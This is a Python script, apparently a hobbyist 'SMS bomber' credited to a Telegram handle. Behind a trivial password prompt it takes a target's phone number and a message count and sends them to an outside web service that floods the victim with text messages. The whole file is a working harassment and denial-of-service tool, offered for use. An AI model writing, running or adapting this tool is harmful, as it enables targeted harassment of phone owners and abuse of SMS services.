import requests
import time
import os
####################
red     =  '\033[0;31m'
green   =  '\033[0;32m'
yellow  =  '\033[0;33m'
blue    =  '\033[0;34m'
magenta =  '\033[0;35m'
cyan    =  '\033[0;36m'
whit    =  '\033[0;37m'
print ("                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       ")
print ("                 $$%%%%%%$$$$ #~ Spam-Sms_v2  ~# $$$$$$$%%%%%%$       ")
print ("                 $$$$~   ~ $$ Coded By @IRI_CYBERY $$ ~   ~$$$$       ")
print ("                 $^^^^^%^^$!~ > By Python 3.7.6 < ~!$^^^^%^^^^$       ")
print ("                 $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$       ")
passwd_decode = b'\xff\xfe~\x00%\x00A\x00%\x00B\x00%\x00C\x00%\x00D\x00%\x00E\x00%\x00~\x00'.decode("utf-16")
print (" For Get Password Go To My Telegram ID : @IRI_CYBERY ")
print (passwd_decode)
passwd = input (cyan + " Enter Script Password >> " + whit )
if passwd != passwd_decode :
    print ( red +"\n Invalid Password ! ! ! " + whit )
    print ("\nwhait 5 sec f0r Exit as Script")
    time.sleep (6)
    input ( magenta +"\nEnter Any Key To Exit . . . " + whit )
    exit ()
if passwd == passwd_decode :
    print ( green + "\n Good ; Password Ok  !! " + whit )
    select = int (input ( blue + """\n
                            [+].1- SmS-BoMber
                            [+].2- Spam-SMS
                            [+].3- Exit

                            Enter Server or Exit :  >> """ + whit ))
    # $Server 2
    if select == 1:
        print("\a")
        # $Get Target Number !!
        mobile = input( green + "\nEnter Target Number:(example > 0917....) >> " + whit )
        print ( cyan + " pls wait ... " + whit )
        print( green + " Number Enterede Secusasful !! " + whit )
        # $Get Count For Sends SmS
        count = int (input ( magenta + " Enter Count For Sends Sms To Target >> " + whit ))
        req = input( red + " Are You Sure To Contnue ? (y/n) " + whit )
        if req == 'y':
                # $Api Url !!
                Response = requests.get ('http://arash-bots.tk/Webservice/Panther_Hack/SmS-BoMb.php?',{'mobile':mobile , 'count':count})
                # $Print Response !!
                print ("Response : >> ", Response )
                input ( yellow + "Press Any Key To Exit >> " + whit )
                exit ()
        if req == 'n':
            print ("Perss Any Key To Exit >>")
            time.sleep (4)
            exit ()
    if select == 2:
        print ("\a")
        # $Get Target Number !!
        number = input ( yellow + "\nEnter Target Number:(example > 0917....) >> " + whit )
        print ( green + " Number Enterede Secusasful !! " + whit )
        req = input ( red + " Are You Sure To Contnue ? (y/n) " + whit )
        if req == 'y':
            # $Api Url !!
            Response = requests.post ('https://arash-bots.tk/Webservice/Panther_Hack/SmS-BooMber.php',
            data = {'number': number})
            # $Print Response !!
            print ("Response : >> ", Response )
            time.sleep (5)
            input ("Enter Any Key to Exit . ..")
            exit ()
        if req == 'n':
                # exit as script
                input ( yellow + " Perss Any Key To Exit >> " + whit )
                exit ()
    if select == 3:
        os.system ("clear")
        input ( yellow + "\n Press Any Key To Exit ... " + whit )
        print ( magenta + "\n Good Luck *_* " + whit )
        print ( green + "\n pls For Exit Wait 3 sec !! " + whit )
        time.sleep (4)
        exit ()
